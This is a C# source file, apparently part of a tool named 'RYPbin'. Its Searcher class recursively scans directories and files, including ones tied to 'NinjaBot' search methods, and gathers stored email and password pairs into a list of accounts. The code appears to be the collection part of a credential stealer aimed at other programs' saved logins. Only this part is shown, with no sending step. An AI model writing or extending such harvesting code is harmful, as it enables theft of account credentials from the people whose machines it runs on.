using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RYPbin
{
    public class Searcher
    {
		private Directories DirList;

		public Searcher()
		{
			DirList = new Directories();
		}

		public List<Account> Search()
		{
			List<Account> Accounts = new List<Account>();

			bool DirNull = false;

			while (!DirNull)
			{
				string SearchIn = DirList.GetNextDirectory();

				if (SearchIn == "null")
				{
					DirNull = true;
				}
				else
				{
					SearchMethod s = SearchMethod.None;
					s = DirList.GetNextSearchMethod();

					if (s == SearchMethod.NinjaBot ||
						s == SearchMethod.NinjaBot2)
					{
						foreach (Account n in DirList.GetFromFile(s, ""))
						{
							Accounts.Add(n);
						}
					}
					else
					{
						foreach (string i in GetFiles(@SearchIn))
						{
							foreach (Account n in DirList.GetFromFile(s, i))
							{
								Accounts.Add(n);
							}
						}
					}
				}
			}

			foreach(Account i in Accounts.ToArray())
			{
				if(i.Email == "" || i.Password == "")
				{
					Accounts.Remove(i);
				}
			}

			return Accounts;
		}

		public static List<string> GetFiles(string DirectoryFind)
		{
			List<string> ret = new List<string>();

			foreach (string i in Directory.GetDirectories(@DirectoryFind))
			{
				foreach (string n in GetFiles(i))
				{
					ret.Add(n);
				}
			}

			foreach (string i in Directory.GetFiles(@DirectoryFind))
			{
				ret.Add(i);
			}

			return ret;
		}
    }
}
